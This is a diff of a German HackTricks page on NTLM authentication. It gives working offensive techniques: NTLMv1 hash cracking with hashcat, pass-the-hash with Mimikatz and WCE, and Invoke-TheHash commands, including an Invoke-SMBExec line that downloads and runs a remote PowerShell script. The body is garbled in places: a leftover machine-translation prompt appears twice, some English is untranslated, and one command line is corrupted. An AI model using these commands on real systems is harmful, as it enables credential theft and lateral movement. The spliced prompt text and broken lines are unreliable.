@@ -7,7 +7,7 @@
 * Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Holen Sie sich das [**offizielle PEASS & HackTricks Merchandise**](https://peass.creator-spring.com)
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.
 
 </details>
@@ -23,10 +23,11 @@ Das Vorhandensein des **"NTLMSSP"**-Headers in Netzwerkpaketen signalisiert eine
 Die Unterstützung der Authentifizierungsprotokolle - LM, NTLMv1 und NTLMv2 - wird durch eine spezifische DLL ermöglicht, die sich unter `%windir%\Windows\System32\msv1\_0.dll` befindet.
 
 **Hauptpunkte**:
-- LM-Hashes sind anfällig und ein leerer LM-Hash (`AAD3B435B51404EEAAD3B435B51404EE`) zeigt an, dass er nicht verwendet wird.
-- Kerberos ist die Standard-Authentifizierungsmethode, wobei NTLM nur unter bestimmten Bedingungen verwendet wird.
-- NTLM-Authentifizierungspakete sind am "NTLMSSP"-Header erkennbar.
-- Die Protokolle LM, NTLMv1 und NTLMv2 werden von der Systemdatei `msv1\_0.dll` unterstützt.
+
+* LM-Hashes sind anfällig und ein leerer LM-Hash (`AAD3B435B51404EEAAD3B435B51404EE`) zeigt an, dass er nicht verwendet wird.
+* Kerberos ist die Standard-Authentifizierungsmethode, wobei NTLM nur unter bestimmten Bedingungen verwendet wird.
+* NTLM-Authentifizierungspakete sind am "NTLMSSP"-Header erkennbar.
+* Die Protokolle LM, NTLMv1 und NTLMv2 werden von der Systemdatei `msv1\_0.dll` unterstützt.
 
 ## LM, NTLMv1 und NTLMv2
 
@@ -41,10 +42,13 @@ Führen Sie _secpol.msc_ aus -> Lokale Richtlinien -> Sicherheitsoptionen -> Net
 ### Registrierung
 
 Dies setzt die Stufe 5:
+
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
+
 Mögliche Werte:
+
 ```
 0 - Send LM & NTLM responses
 1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
@@ -53,6 +57,7 @@ Mögliche Werte:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
+
 ## Grundlegendes NTLM-Domänenauthentifizierungsschema
 
 1. Der **Benutzer** gibt seine **Anmeldeinformationen** ein.
@@ -97,10 +102,13 @@ Denken Sie daran, dass der Drucker das Computerkonto während der Authentifizier
 NTLMv1 kann auch mit dem NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) gebrochen werden, das NTLMv1-Nachrichten in einer Methode formatiert, die mit hashcat geknackt werden kann.
 
 Der Befehl
+
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
+
 Die folgenden Inhalte stammen aus einem Buch über Hacking-Techniken. Der folgende Inhalt stammt aus der Datei /hive/hacktricks/windows-hardening/ntlm/README.md. Übersetzen Sie den relevanten englischen Text ins Deutsche und geben Sie die Übersetzung zurück, wobei Sie genau die gleiche Markdown- und HTML-Syntax beibehalten. Übersetzen Sie keine Dinge wie Code, Namen von Hacking-Techniken, Hacking-Wörter, Cloud/SaaS-Plattformnamen (wie Workspace, aws, gcp...), das Wort "Leak", Pentesting und Markdown-Tags. Fügen Sie auch keine zusätzlichen Inhalte hinzu, abgesehen von der Übersetzung und der Markdown-Syntax.
+
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -126,16 +134,22 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
+
 Erstellen Sie eine Datei mit dem Inhalt:
+
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
+
 Führen Sie hashcat aus (am besten verteilt über ein Tool wie hashtopolis), da dies sonst mehrere Tage dauern wird.
+
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
+
 In diesem Fall wissen wir, dass das Passwort hier "password" ist, daher werden wir zu Demonstrationszwecken schummeln:
+
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -144,7 +158,9 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
+
 Wir müssen nun die Hashcat-Utilities verwenden, um die geknackten DES-Schlüssel in Teile des NTLM-Hashs umzuwandeln:
+
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -152,16 +168,21 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
+
 Schließlich der letzte Teil:
+
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
+
 Der folgende Inhalt stammt aus einem Hacking-Buch über Hacking-Techniken. Der folgende Inhalt stammt aus der Datei /hive/hacktricks/windows-hardening/ntlm/README.md. Übersetze den relevanten englischen Text ins Deutsche und gib die Übersetzung zurück, wobei die gleiche Markdown- und HTML-Syntax beibehalten wird. Übersetze keine Dinge wie Code, Hacking-Technikenamen, Hacking-Wörter, Cloud/SaaS-Plattformnamen (wie Workspace, aws, gcp...), das Wort "Leak", Pentesting und Markdown-Tags. Füge auch keine zusätzlichen Inhalte hinzu, abgesehen von der Übersetzung und der Markdown-Syntax.
+
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
+
 ### NTLMv2 Challenge
 
 Die **Herausforderungslänge beträgt 8 Bytes** und es werden **2 Antworten gesendet**: Eine ist **24 Bytes** lang und die Länge der **anderen** ist **variabel**.
@@ -182,15 +203,17 @@ Sie müssen ein **Tool verwenden**, das die **NTLM-Authentifizierung mit** diese
 ### **Mimikatz**
 
 **Muss als Administrator ausgeführt werden**.
+
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
+
 Dies startet einen Prozess, der den Benutzern gehört, die Mimikatz gestartet haben, aber intern in LSASS sind die gespeicherten Anmeldeinformationen diejenigen, die in den Mimikatz-Parametern enthalten sind. Dann können Sie auf Netzwerkressourcen zugreifen, als wären Sie dieser Benutzer (ähnlich wie der `runas /netonly`-Trick, aber Sie müssen das Klartext-Passwort nicht kennen).
 
 ### Pass-the-Hash von Linux aus
 
 Sie können Codeausführung auf Windows-Maschinen mit Pass-the-Hash von Linux aus erhalten.\
-[**Hier erfahren Sie, wie es geht.**](../../windows/ntlm/broken-reference/)
+[**Hier erfahren Sie, wie es geht.**](https://github.com/carlospolop/hacktricks/blob/de/windows/ntlm/broken-reference/README.md)
 
 ### Impacket Windows-Kompilierungstools
 
@@ -206,9 +229,11 @@ Sie können [hier impacket-Binärdateien für Windows herunterladen](https://git
 Sie können die PowerShell-Skripte von hier erhalten: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
 #### Invoke-SMBExec
+
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
+
 #### Invoke-WMIExec
 
 `Invoke-WMIExec` is a PowerShell script that leverages Windows Management Instrumentation (WMI) to execute commands on remote Windows systems. It can be used for lateral movement and post-exploitation activities during a penetration test.
@@ -226,65 +251,69 @@ Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd 
 In this example, `Invoke-WMIExec` is used to create a new user account named "hacker" with the password "P@ssw0rd" on the target system with the IP address 192.168.1.100. The script is executed with the credentials of the Administrator account.
 
 Note that `Invoke-WMIExec` can be detected by antivirus software, so it is important to use it responsibly and only on systems that you have permission to test.
+
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
+
 #### Invoke-SMBClient
 
 Der Befehl `Invoke-SMBClient` wird verwendet, um eine Verbindung zu einem SMB-Server herzustellen und verschiedene Aktionen auszuführen. Dieser Befehl ermöglicht es Ihnen, Dateien herunterzuladen, hochzuladen, zu löschen und zu durchsuchen, sowie Informationen über Freigaben und Berechtigungen abzurufen.
 
-##### Syntax
+**Syntax**
 
 ```powershell
 Invoke-SMBClient -Target <Server-IP> -Share <Share-Name> -Username <Username> -Password <Password> -Action <Action> [-File <File-Path>] [-Destination <Destination-Path>] [-Recursive] [-Verbose]
 ```
 
-##### Parameter
+**Parameter**
 
-- `Target`: Die IP-Adresse des SMB-Servers, zu dem eine Verbindung hergestellt werden soll.
-- `Share`: Der Name der Freigabe auf dem SMB-Server.
-- `Username`: Der Benutzername, der für die Authentifizierung verwendet werden soll.
-- `Password`: Das Passwort, das für die Authentifizierung verwendet werden soll.
-- `Action`: Die auszuführende Aktion. Mögliche Werte sind `Download`, `Upload`, `Delete`, `List` und `Info`.
-- `File` (optional): Der Pfad zur Datei, die hochgeladen oder heruntergeladen werden soll.
-- `Destination` (optional): Der Zielort für die hochgeladene Datei oder der Speicherort für die heruntergeladene Datei.
-- `Recursive` (optional): Gibt an, ob die Aktion rekursiv auf Unterverzeichnisse angewendet werden soll.
-- `Verbose` (optional): Gibt detaillierte Ausgaben während der Ausführung des Befehls aus.
+* `Target`: Die IP-Adresse des SMB-Servers, zu dem eine Verbindung hergestellt werden soll.
+* `Share`: Der Name der Freigabe auf dem SMB-Server.
+* `Username`: Der Benutzername, der für die Authentifizierung verwendet werden soll.
+* `Password`: Das Passwort, das für die Authentifizierung verwendet werden soll.
+* `Action`: Die auszuführende Aktion. Mögliche Werte sind `Download`, `Upload`, `Delete`, `List` und `Info`.
+* `File` (optional): Der Pfad zur Datei, die hochgeladen oder heruntergeladen werden soll.
+* `Destination` (optional): Der Zielort für die hochgeladene Datei oder der Speicherort für die heruntergeladene Datei.
+* `Recursive` (optional): Gibt an, ob die Aktion rekursiv auf Unterverzeichnisse angewendet werden soll.
+* `Verbose` (optional): Gibt detaillierte Ausgaben während der Ausführung des Befehls aus.
 
-##### Beispiele
+**Beispiele**
 
-- Datei von einem SMB-Server herunterladen:
+* Datei von einem SMB-Server herunterladen:
 
 ```powershell
 Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action Download -File test.txt -Destination C:\Downloads
 ```
 
-- Datei auf einen SMB-Server hochladen:
+* Datei auf einen SMB-Server hochladen:
 
 ```powershell
 Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action Upload -File C:\Documents\test.txt -Destination /uploads
 ```
 
-- Datei von einem SMB-Server löschen:
+* Datei von einem SMB-Server löschen:
 
 ```powershell
 Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action Delete -File test.txt
 ```
 
-- Liste der Dateien und Verzeichnisse auf einem SMB-Server anzeigen:
+* Liste der Dateien und Verzeichnisse auf einem SMB-Server anzeigen:
 
 ```powershell
 Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action List
 ```
 
-- Informationen über eine Freigabe auf einem SMB-Server anzeigen:
+* Informationen über eine Freigabe auf einem SMB-Server anzeigen:
 
 ```powershell
 Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action Info
 ```
+
 ```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
+
 #### Invoke-SMBEnum
 
 Der Befehl `Invoke-SMBEnum` wird verwendet, um Informationen über SMB (Server Message Block) in einem Windows-Netzwerk zu sammeln. SMB ist ein Protokoll, das für die Datei- und Druckerfreigabe sowie für die Kommunikation zwischen Computern in einem Netzwerk verwendet wird.
@@ -302,15 +331,19 @@ Invoke-SMBEnum -Target 192.168.1.100
 Dieser Befehl führt eine SMB-Enumeration auf dem Zielcomputer mit der IP-Adresse 192.168.1.100 durch und gibt Informationen über SMB-Freigaben, Benutzer, Gruppen und Richtlinien zurück.
 
 Es ist wichtig zu beachten, dass `Invoke-SMBEnum` ein mächtiges Werkzeug ist und mit Vorsicht verwendet werden sollte. Es sollte nur in legalen und autorisierten Umgebungen eingesetzt werden, um Sicherheitslücken zu identifizieren und zu beheben.
+
 ```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
+
 #### Invoke-TheHash
 
 Diese Funktion ist eine **Mischung aus allen anderen**. Sie können **mehrere Hosts** übergeben, **jemanden ausschließen** und die **Option** auswählen, die Sie verwenden möchten (_SMBExec, WMIExec, SMBClient, SMBEnum_). Wenn Sie **SMBExec** und **WMIExec** auswählen, aber keinen _**Command**_-Parameter angeben, wird nur **überprüft**, ob Sie **ausreichende Berechtigungen** haben.
+
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
+
 ### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
 ### Windows Credentials Editor (WCE)
@@ -318,9 +351,11 @@ Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100
 **Muss als Administrator ausgeführt werden**
 
 Dieses Tool führt die gleiche Funktion wie Mimikatz aus (Änderung des LSASS-Speichers).
+
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
+
 ### Manuelle Windows-Fernausführung mit Benutzername und Passwort
 
 {% content-ref url="../lateral-movement/" %}
@@ -329,7 +364,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ## Extrahieren von Anmeldeinformationen von einem Windows-Host
 
-**Weitere Informationen dazu, wie Sie Anmeldeinformationen von einem Windows-Host erhalten, finden Sie auf dieser Seite** [**hier**](broken-reference)**.**
+**Weitere Informationen dazu, wie Sie Anmeldeinformationen von einem Windows-Host erhalten, finden Sie auf dieser Seite** [**hier**](https://github.com/carlospolop/hacktricks/blob/de/windows-hardening/ntlm/broken-reference/README.md)**.**
 
 ## NTLM Relay und Responder
 
@@ -350,7 +385,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 * Arbeiten Sie in einem **Cybersecurity-Unternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **senden.**
 
 </details>
